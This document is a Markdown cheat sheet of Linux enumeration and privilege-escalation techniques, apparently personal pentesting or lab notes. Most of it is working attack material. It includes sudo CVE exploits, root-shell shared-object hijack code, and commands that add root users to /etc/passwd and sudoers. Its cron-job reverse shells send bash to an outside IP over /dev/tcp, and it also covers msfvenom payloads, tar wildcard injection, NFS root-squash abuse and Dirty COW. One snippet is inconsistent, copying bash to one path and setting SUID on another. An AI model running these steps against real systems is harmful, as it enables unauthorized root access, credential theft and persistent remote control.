# Enumeration ✅📚
## Basic-Enumeration ✅
```bash
id
env
sudo -V
sudo -l
dpkg -l
history
uname -a
ifconfig
bash --version

ps -A
ps aux
ps axjf


cat ~/.bashrc
cat ~/.bash_history
cat ~/.bash_profile
cat /proc/version # (Linux kernel version)
cat /etc/issue # (Linux distribution version) 
cat /etc/*-release # (Linux distribution version)

cat /etc/hosts
cat /etc/passwd
cat /etc/shadow
cat /etc/shells
cat /etc/sudoers
cat /etc/crontab

ls -ltrh /etc/hosts
ls -ltrh /etc/passwd
ls -ltrh /etc/shadow
ls -ltrh /etc/crontab
ls -ltrh /etc/sudoers

find / -name id_rsa 2> /dev/null
find / -name authorized_keys 2> /dev/null


find / -type f -name "*.log" 2>/dev/null
find / -type f -name "*.bak" 2>/dev/null
find / -type f -name "*.conf" 2>/dev/null

find / -name "*.bak" -type f -print 2>/dev/null | xargs /bin/cat | grep -ie 'pass'

find / -user user 2>/dev/null

find / -writable -type f 2>/dev/null # (Find world-writeable files)
find / -perm -o w -type f 2>/dev/null # (Find world-writeable files)
find / -perm -222 -type f 2>/dev/null # (Find world-writeable files)

find / -writable -type d 2>/dev/null # (Find world-writeable folders)
find / -perm -o w -type d 2>/dev/null # (Find world-writeable folders)
find / -perm -222 -type d 2>/dev/null # (Find world-writeable folders)

find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u # (Find writeable dir)
```
## Tools-For-Enumeration ✅
[LinEnum](https://github.com/rebootuser/LinEnum)

[PEASS-ng](https://github.com/peass-ng/PEASS-ng)

[linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)

[linux-smart-enum](https://github.com/diego-treitos/linux-smart-enumeration)

[linux-Exploit-Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)

[linux-Exploit-Suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)

## Network-Enumeration ✅
```bash
last
lsof -i
lsof -i :80
ss -tulpn
netstat -antp
netstat -antup
netstat -tulpn
grep 80 /etc/services

netstat -a # (all)
netstat -p # (pid)
netstat -a # (tcp)
netstat -u # (udp)
netstat -l # (listening mode)
netstat -o # (Display timers)
netstat -i # (Shows interface)
netstat -n # (Do not resolve names)
```
## Users_Enumeration ✅
```bash
who | wc -l
users | wc -w
cat /etc/passwd
awk -F: '$3 >= 1000 {print $1}' /etc/passwd | wc -l
```
## SUID_SGID_Capabilities_Files_enumeration ✅
```
getcap -r / 2>/dev/null # Capabilities enumeration # If "cap_setuid+ep" existed. 
find / -perm -02000 -ls 2>/dev/null
find / -perm -04000 -ls 2>/dev/null
find / -type f \( -perm -4000 -o -perm -2000 \) -ls 2> /dev/null
```
## Metasploit-Command-Enumeration ✅
```bash
set --global LHOST 10.11.99.141
run post/windows/manage/enable_rdp # open and enable windows rdp  
run post/multi/recon/local_exploit_suggester
```

# Privilege-Escalation ✅📚
## sudo ✅📚
[**GTFOBins**](https://gtfobins.github.io/)
### Shell Escape Sequences ✡️
```bash
sudo -l
```
#### CVE-2019-18634 🔆
```bash
# sudo -l - pwfeedback - CVE-2019-18634
perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id # in target system for test
# error = Password: Segmentation fault
wget https://github.com/saleemrashid/sudo-cve-2019-18634/blob/master/exploit.c # in our kali 
# transfer exploit.c target file to target 
gcc exploit.c -o exploit # in target system
./exploit # in target system
```
#### CVE-2021-3156 🔆
```bash
# sudo program from 1.8.2-1.8.31p2 and 1.9.0-1.9.5p1 - CVE-2021-3156 
sudoedit -s '\' $(python3 -c 'print("A"*1000)') # in target system for test
# error = malloc(): memory corruption
# error = Aborted (core dumped)
git clone https://github.com/blasty/CVE-2021-3156 # in our kali 
# transfer CVE-2021-3156 target dir to target 
make # in target system
```
#### If "(ALL, !root)" existed. 🔆
```bash
# CVE-2019-14287 (sudo versions < 1.8.28) -- 1.8.28 fixed
sudo -u#-1 /usr/bin/<somecommand> # go to # https://gtfobins.github.io/#
```
#### If "/usr/sbin/apache2" existed. 🔆
```bash
sudo apache2 -f /etc/shadow # read line 1 (root-hash)
echo '[Pasted Root Hash]' > hash.txt
john --wordlist=/usr/share/wordlists/wordlist hash.txt
```
### Environment Variables ✡️
```note
Run "ldd" against the any program file to see which shared libraries are used by the program.
```
#### If "env_keep+=LD_PRELOAD" existed. 🔆
```bash
nano /tmp/preload.c ⬇️⬇️⬇️⬇️
---------------------
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
---------------------
gcc /tmp/preload.c -fPIC -shared -nostartfiles -o /tmp/preload.so 
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```
#### If "env_keep+=LD_LIBRARY_PATH" existed. 🔆
```bash
ldd /usr/sbin/apache2 #  libcrypt.so.1 => /lib/libcrypt.so.1 
nano /tmp/library_path.c ⬇️⬇️⬇️⬇️
---------------------
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
---------------------
gcc  /tmp/library_path.c -fPIC -shared -o /tmp/libcrypt.so.1 
sudo LD_LIBRARY_PATH=/tmp apache2
```
## Weak File Permissions ✅
```bash
cat /etc/shadow
unshadow /etc/passwd /etc/shadow > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Writable /etc/shadow OR /etc/passwd ✡️
```bash
openssl passwd <password>
mkpasswd -m sha-512 <new-password>
openssl passwd -1 -salt <username> <password>

change root password from /etc/shadow
Format change to /etc/shadow = root:<password>:19966:0:99999:7:::

Add to end the /etc/passwd
Format add to /etc/passwd = <username>:<passwordhash>:0:0:root:/root:/bin/bash

echo 'mobin:$1$8VO3cUZu$als/bleGjZ3SVjE5EGzvh/:0:0:root:/root:/bin/bash' >> /etc/passwd
echo 'mobin:$6$/LuWBv7L4QbfG1kf$pb0sFxOLHKiMNiAr2vMdpRc2e8mljxoUlm33fY6KEXLzcH7K51zegdnOYygurWuP/2.KW3eQvcBHXBn9/Jqnj0:0:0:root:/root:/bin/bash' >> /etc/passwd
password=Mobin@

su <username> ( Switch to new root user )
```
[editing-etc-passwd-file-for-privilege-escalation](http://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
### Writable /etc/sudoers ✡️
```bash
echo 'ali ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
useradd ali && (echo -e 'Mobin@\nMobin@' | passwd ali) && (echo "ali ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers)
```
### /etc/crontab ✡️
```bash
echo '* * * * * root overwrite.sh' >> /etc/crontab # If "crontab" was writable 
```
#### Cron Jobs - File Permissions 🔆
```bash
cat /etc/crontab
locate overwrite.sh
-------------------------------------------------
echo '#!/bin/bash' > /usr/local/bin/overwrite.sh
echo 'bash -i >& /dev/tcp/10.11.99.141/4444 0>&1' >> /usr/local/bin/overwrite.sh
-----------------------OR------------------------
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
-------------------------------------------------
nc -nvlp 4444 # our kali 
```
#### Cron Jobs - PATH Environment Variable 🔆
```bash
# Check "PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin" code in crontab file.
# If there is a writable directory in "PATH=", inside that directory we create a file with the same name as "overwrite.sh" file and write reverseshell inside it.

echo '#!/bin/bash' > /home/user/overwrite.sh
echo 'bash -i >& /dev/tcp/10.11.99.141/4444 0>&1' >> /home/user/overwrite.sh
```
#### Cron Jobs - Wildcards(1) 🔆
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf # our kali 
# We transfer "shell.elf" file to the target system 
nc -nvlp 4444 # our kali
chmod +x /home/user/shell.elf # target machine 
touch /home/user/--checkpoint=1 # target machine
touch /home/user/--checkpoint-action=exec=shell.elf # target machine 
```
#### Cron Jobs - Wildcards(2) 🔆
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh # target machine 
chmod +x /home/user/runme.sh # target machine 
touch /home/user/--checkpoint=1 # target machine
touch /home/user/--checkpoint-action=exec=bash\ runme.sh # target machine 
```
## Capabilities ✅
```bash
getcap -r / 2>/dev/null # If "cap_setuid+ep" existed. 
# go to # https://gtfobins.github.io/#
```
## **SUID_SGID** ✅
### Known Exploits ✡️
```bash
searchsploit <name app>
```
### **Symlinks** ✡️
```bash
```

### Shared Object Injection ✡️
```bash
file /usr/local/bin/suid-so # setuid setgid ELF 64-bit LSB executable
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file" # Find a shared Object 
mkdir /home/user/.config 
nano /tmp/libcalc.c ⬇️⬇️⬇️⬇️
-------------------
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
-------------------
gcc /tmp/libcalc.c -shared -fPIC -o /home/user/.config/libcalc.so
/usr/local/bin/suid-so
```
### Environment Variables(1) ✡️
```bash
/usr/local/bin/suid-env
strings /usr/local/bin/suid-env # service apache2 start
nano /tmp/service.c
-------------------
int main() {
        setuid(0);
        system("/bin/bash -p");
}
-------------------
gcc /tmp/service.c -o /tmp/service 
export PATH=/tmp:$PATH
/usr/local/bin/suid-env
```
### Environment Variables(2) ✡️
```bash
/usr/local/bin/suid-env
strings /usr/local/bin/suid-env # End file is 'service apache2 start'
nano /tmp/service
-------------------
#!/bin/bash
cp /bin/bash /tmp/rootshell
chmod +s /tmp/mobin
-------------------
export PATH=/tmp:$PATH
/usr/local/bin/suid-env
```
### Environment Variables(3) ✡️
```bash
/usr/local/bin/suid-env
strings /usr/local/bin/suid-env # service apache2 start
nano /tmp/service.c
-------------------
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
-------------------
gcc /tmp/service.c -o /tmp/service 
export PATH=/tmp:$PATH
/usr/local/bin/suid-env
```
### Abusing Shell Features ✡️
```bash
/bin/bash --version
```
#### If " 'Bash versions' < 4.2-048 " 🔆
```bash
strings /usr/local/bin/suid-env2 # End file is '/usr/sbin/service apache2 start'
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```
#### If " 'Bash versions' > 4.4 " 🔆
```bash 
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
/tmp/rootbash -p
```
## Kernel Exploits ✅
### Example "Dirty COW" ✡️
```bash
bash linux-exploit-suggester.sh # target machine
perl linux-exploit-suggester-2.pl # target machine

searchsploit --cve CVE-2016-5195 # our kali
searchsploit -m linux/local/40838.c # our kali
# We transfer "40838.c" file to the target system

gcc /tmp/40838.c -pthread -o /tmp/exploit # target machine
./exploit # target machine
```
## NFS ✅
```bash
cat /etc/exports
# From the output, notice that (no_root_squash) option is defined for the "/tmp" export.
```
### Root-Squashing (1) ✡️
```bash
cat /etc/exports # target machine (no_root_squash)
mkdir /tmp/nfs # our kali
sudo mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs # our kali
sudo msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf # our kali
sudo chmod +xs /tmp/nfs/shell.elf # our kali
/tmp/shell.elf # target machine
```
### Root-Squashing (2) ✡️
```bash
showmount -e 10.10.10.10 # our kali
mkdir /tmp/nfs # our kali
sudo mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs # our kali
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/nfs/shell.c # our kali
sudo gcc /tmp/nfs/shell.c -o /tmp/nfs/shell # our kali 
sudo chmod +xs /tmp/nfs/shell # our kali OR target machine
/tmp/shell # target machine
```
### Root-Squashing (3) ✡️
```bash
cat /etc/exports # target machine (no_root_squash)
cp /bin/bash /tmp/bash # target machine
mkdir /tmp/nfs # our kali
sudo mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs # our kali
sudo chown root:root /tmp/nfs/bash # our kali
sudo chmod +xs /tmp/nfs/bash # our kali
/tmp/bash -ip # target machine
```
## Docker ✅
```bash
./docker ps # find image name (1)
./docker images # find image name (2)
./docker run -v /:/mnt --rm -it <image name> chroot /mnt sh
```
[docker-gtfobins](https://gtfobins.github.io/gtfobins/docker/)

#### The following list shows the most commons file extensions for linux: ❗️☪️
```bash
.a   : a static library ;
.au    : an audio file ;
.bin :    a) a binary image of a CD (usually a .cue file is also included); b) represents that the file is binary and is meant to be executed ;
.bz2 :    A file compressed using bzip2 ;
.c :    A C source file ;
.conf :  A configuration file. System-wide config files reside in /etc while any user-specific configuration will be somewhere in the user’s home directory ;
.cpp :  A C++ source file ;
.deb :  a Debian Package;
.diff :   A file containing instructions to apply a patch from a base version to another version of a single file or a project (such as the linux kernel);
.dsc:   a Debian Source information file ;
.ebuild : Bash script used to install programs through the portage system. Especially prevalent on Gentoo systems;
.el :  Emacs Lisp code file;
.elc :  Compiled Emacs Lisp code file;
.gif :    a graphical or image file;
.h :a C or C++ program language header file;
.html/.htm  :   an HTML file;
.iso :    A image (copy) of a CD-ROM or DVD in the ISO-9660 filesystem format;
.jpg :    a graphical or image file, such as a photo or artwork;
.ko :    The kernel module extension for the 2.6.x series kernel;
.la :    A file created by libtool to aide in using the library;
.lo :    The intermediate file of a library that is being compiled;
.lock :    A lock file that prevents the use of another file;
.log :    a system or program’s log file;
.m4 :    M4 macro code file;
.o :    1) The intermediate file of a program that is being compiled ; 2) The kernel module extension for a 2.4 series kernel ; 3)a program object file;
.pdf :    an electronic image of a document;
.php :     a PHP script;
.pid :    Some programs write their process ID into a file with this extention;
.pl :    a Perl script;
.png :    a graphical or image file;
.ps :    a PostScript file; formatted for printing;
.py :    a Python script;
.rpm :    an rpm package. See Distributions of Linux for a list of distributions that use rpms as a part of their package management system;
.s :    An assembly source code file;
.sh :    a shell script;
.so :     a Shared Object, which is a shared library. This is the equivalent form of a Windows DLL file;
.src  :    A source code file. Written in plain text, a source file must be compiled to be used;
.sfs :    Squashfs filesystem used in the SFS Technology;
.tar.bz2 , tbz2, tar.gz :     a compressed file per File Compression;
.tcl :    a TCL script;
.tgz :     a compressed file per File Compression. his may also denote a Slackware binary or source package;
.txt :    a plain ASCII text file;
.xbm :    an XWindows Bitmap image;
.xpm :     an image file;
.xcf.gz, xcf :  A GIMP image (native image format of the GIMP);
.xwd :    a screenshot or image of a window taken with xwd;
.zip :extension for files in ZIP format, a popular file compression format;
.wav :    an audio file.
```
